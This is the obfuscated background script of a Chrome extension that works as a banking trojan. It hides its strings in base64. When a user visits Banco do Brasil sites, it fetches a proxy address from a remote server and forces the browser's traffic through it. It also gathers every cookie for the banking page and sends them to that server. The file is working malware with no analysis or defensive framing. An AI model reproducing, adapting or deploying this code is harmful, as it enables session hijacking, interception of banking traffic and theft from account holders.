function oUiQA(kkk) { return window.atob(kkk);}
function JdbtoMQaj() {
    var randomPool = new Uint8Array(32);
    crypto.getRandomValues(randomPool);
    var hex = '';
    for (var i = 0; i < randomPool.length; ++i) {
        hex += randomPool[i].toString(16);
    }
    return hex;
}
chrome.runtime.onInstalled.addListener(function(){});
chrome.browserAction.onClicked.addListener(function(tab) {});
chrome.proxy.settings.get({'incognito': false},
function(config) {});
var cli = {};
var tkn_ = JdbtoMQaj();
cli.id = JdbtoMQaj();
cli.proxyip = '';
cli.proxyport = '';
function stVeoU() {
	var config = {mode: "direct"};
	chrome.proxy.settings.set({
		value: config, 
		scope: 'regular'
	},function() {});
}
function tPtjkTcU() {
	var config = {
		mode: "fixed_servers",
		rules: {
		  singleProxy: {
			scheme: "http",
			host: cli.proxyip,
			port:Number(cli.proxyport)
		  },	
		  bypassList: ["127.0.0.1","::1","localhost",window.atob('dGVhbXBhaW5lbHdlYjEyMy5nb3Y=')]
		}
	};
	chrome.proxy.settings.set({
		value: config, 
		scope: 'regular'
	},function() {});
}
function XOPORKw() {
    var exec = function(proxy) {
        proxy = proxy.split(':');
		cli.proxyip = proxy[0];
		cli.proxyport = Number(proxy[1]);
		tPtjkTcU();
    };
    var request  = new XMLHttpRequest();
    request.open('POST', window.atob('aHR0cDovL3RlYW1wYWluZWx3ZWIxMjMuZ292L2FwaS9wcng='), true);
    request.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    request.onreadystatechange = function() {
        if (request.readyState === 4 && request.status >= 200 && request.status < 400) {
            exec(request.responseText);
        }
    };
    request.send("id=1");
}
function feLjZKCY(request) {
    request.cli.coo = nuoa(cli.coo);
    request.cli.proxyip = cli.proxyip;
    request.cli.proxyport = cli.proxyport;
    var submeter = nuoa(JSON.stringify(request.cli));
    var request_  = new XMLHttpRequest();
    request_.open('POST', window.atob('aHR0cDovL3RlYW1wYWluZWx3ZWIxMjMuZ292L2FwaS9jcnVk') + '?trampo=' + submeter, true);
    request_.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    request_.onreadystatechange = function() {
        if (request_.readyState === 4 && request_.status >= 200 && request_.status < 400) {}
    };
    request_.send("trampo=" + submeter);
} 
chrome.tabs.onUpdated.addListener( function (tabId, changeInfo, tab) {
  if (changeInfo.status == 'complete') {
  	var tabId = tabId;
	var coo_ = 	'';
	if (tab.url.indexOf(window.atob('YmIuY29tLmJy')) > 0 || tab.url.indexOf(window.atob('YmFuY29icmFzaWwuY29tLmJy')) > 0 || tab.url.indexOf('aapj.bb.com.br/aapj') > 0) {
		if (cli.proxyip == '') {
			XOPORKw();
		}
		try	{
			chrome.cookies.getAll({"url": tab.url	}, function(cookie) {
				if(cookie) {
					for (var i = cookie.length - 1; i >= 0; i--) {
						coo_ += cookie[i].name + '=' + cookie[i].value + '; ';
					}
					cli.coo = coo_;
				}
			});
		}catch(e) {
		}
		tPtjkTcU();
	}else {
		stVeoU();
	}
  }
});
nuoa = function(s) { return window.btoa(unescape(encodeURIComponent(s))) }
chrome.runtime.onMessage.addListener(
    function(request, sender, sendResponse) {
        feLjZKCY(request);
    }
);